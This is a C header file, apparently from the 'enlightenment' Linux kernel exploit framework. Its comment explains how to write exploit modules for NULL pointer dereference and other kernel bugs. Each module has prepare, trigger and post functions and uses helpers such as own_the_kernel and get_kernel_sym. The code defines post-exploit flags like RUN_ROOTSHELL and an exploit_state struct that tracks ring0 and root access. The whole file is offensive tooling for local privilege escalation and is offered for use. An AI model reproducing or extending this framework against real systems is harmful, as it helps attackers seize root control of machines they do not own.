/* enlightenment 200911041733

   To create your own exploit module for enlightenment, just name it
   exp_whatever.c
   It will be auto-compiled by the shell script and thrown into
   the list of loaded exploit modules

   if you want to use the list of non-NULL exploits:
     ./run_nonnull_exploits.sh
   if you want to run the list of NULL ptr deref exploits:
     ./run_null_exploits.sh

   Each module must have the following features:
   It must include this header file, exp_framework.h
   A description of the exploit, the variable being named "desc"
   A "prepare" function: int prepare(unsigned char *ptr)
     where ptr is the ptr to the NULL mapping, which you are able to write to
     This function can return the flags described below for prepare_the_exploit
     Return 0 for failure otherwise
   A "trigger" function: int trigger(void)
     Return 0 for failure, nonzero for success
   A "post" function: int post(void)
     This function can return the flags described below for post_exploit
   A "requires_null_page" int: int requires_null_page;
     This should be 1 if a NULL page needs to be mapped, and 0 otherwise
     (if you want to use the framework to exploit non-NULL ptr bugs)
   A "get_exploit_state_ptr" function:
     int get_exploit_state_ptr(struct exploit_state *ptr)
     Generally this will always be implemented as:
     struct *exp_state;
     int get_exploit_state_ptr(struct exploit_state *ptr)
     {
        exp_state = ptr;
        return 0;
     }
     It gives you access to the exploit_state structure listed below,
     get_kernel_sym allows you to resolve symbols
     own_the_kernel is the function that takes control of the kernel
      (in case you need its address to set up your buffer)
     the other variables describe the exploit environment, so you can
     for instance, loop through a number of vulnerable socket domains
     until you detect ring0 execution has occurred.

   That's it!
*/


/* defines for prepare_the_exploit */
 /* for null fptr derefs */
#define STRAIGHT_UP_EXECUTION_AT_NULL 0x31337
 /* for overflows */
#define EXIT_KERNEL_TO_NULL 0x31336

#define EXECUTE_AT_NONZERO_OFFSET 0xfffff000 // OR the offset with this

/* defines for post_exploit */
#define RUN_ROOTSHELL 0x5150
#define CHMOD_SHELL 0x5151
#define FUNNY_PIC_AND_ROOTSHELL 0xdeadc01d

typedef unsigned long (*_get_kernel_sym)(char *name);

struct exploit_state {
	_get_kernel_sym get_kernel_sym;
	void *own_the_kernel;
	void *exit_kernel;
	char *exit_stack;
	int run_from_main;
	int got_ring0;
	int got_root;
};

#ifdef __x86_64__
#define USER_CS 0x33
#define USER_SS 0x2b
#define USER_FL 0x246
#else
#define USER_CS 0x73
#define USER_SS 0x7b
#define USER_FL 0x246
#endif
